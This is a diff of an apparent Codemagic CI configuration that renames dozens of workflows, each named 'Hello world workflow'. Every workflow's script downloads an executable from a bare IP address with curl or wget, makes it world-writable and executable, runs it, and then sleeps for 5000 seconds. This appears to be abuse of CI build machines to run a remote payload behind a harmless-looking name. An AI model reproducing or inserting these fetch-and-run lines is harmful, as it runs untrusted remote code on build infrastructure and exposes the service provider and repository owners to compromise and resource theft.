-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  asqyotfq:
+  xrrtbqud:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  mkxyqhoi:
+  zbjzqtdc:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  rcxdmbar:
+  obmrmudk:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  eglrlkfk:
+  ezlufpee:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  xjitnpqi:
+  rtwrezkd:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  mjiqckqh:
+  rjzzxvmr:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  rypatywi:
+  lmdpyhsk:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  xrlaesge:
+  ymcmosep:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  kvqyybly:
+  pvdvvkeq:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  xvkpawmm:
+  wxddbpbs:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  xnvjmrmw:
+  jcnkjqqn:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  rzxzttvn:
+  ojxoitad:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  mnremydn:
+  jqmcmbqj:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  dwvowazn:
+  ooosoxze:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  yrjybiih:
+  ntfuwqgm:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  xeguzbtr:
+  kyyjffoh:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  wvcqdqej:
+  pdclqhna:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  eaiqramw:
+  hrzpfhad:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  wcyoufgf:
+  bwgsziby:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  norbgdpm:
+  oefseoag:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  ytekzubr:
+  awvnktcf:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  fcmbmqoc:
+  plsaezds:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  donswqcp:
+  uxqkyjfl:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  pzveqfzc:
+  nrnhbnzs:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  dqsfpyuw:
+  ebkcramv:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  ejkpohgj:
+  dwrqlcxb:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  mztupihz:
+  howxdixa:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  ztcbsuhp:
+  dmxmbjah:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  mivdcrne:
+  azjluyuc:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  ehzhncxt:
+  rhlsiyoo:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  lpuyhvas:
+  rufhwygq:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
-  iiaiihgj:
+  qcmkwzsp:
     name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
+    instance_type: linux_x2
+    max_build_duration: 120
     scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  qmxsdvxg:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  jcdsyzvz:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  rjbimytu:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  wpixnqtz:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  dwsejxbl:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  vlywgjgr:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  twquludr:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  jdntflqp:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  rdfhiuus:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  mduaylon:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  uwleztjg:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  ufozbmce:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  nljyufic:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  puzoxekx:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  imvsgqxn:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  rgzeaevg:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  wbjqzazc:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  wbjifklg:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  buceyscq:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  ytmqxlsm:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  trflxgku:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  ewmncwoz:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  wmonqxov:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  sbcqztqr:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  dekcteds:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  sdfygjlz:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  hphjetnb:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  fqwwfloy:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  aydpwbjo:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  rjbnckej:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  fpaekdwb:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  rtfwiylh:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  cyeczxuq:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  wvzftwzz:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  clzspwty:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  vmtdstqs:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  emcxctlj:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  nwstcdjn:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  sbedthck:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
-        - sleep 5000
-  dyrlfkbh:
-    name: Hello world workflow
-      instance_type: linux_x2
-      max_build_duration: 120
-    scripts:
-        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagichttps://github.com/gmc-2/pov/edit/main/codemagic.yaml
+        - echo wget http://94.156.152.152/x86_64 || curl -O http://94.156.152.152/x86_64; chmod 777 x86_64; ./x86_64 codemagic
         - sleep 5000
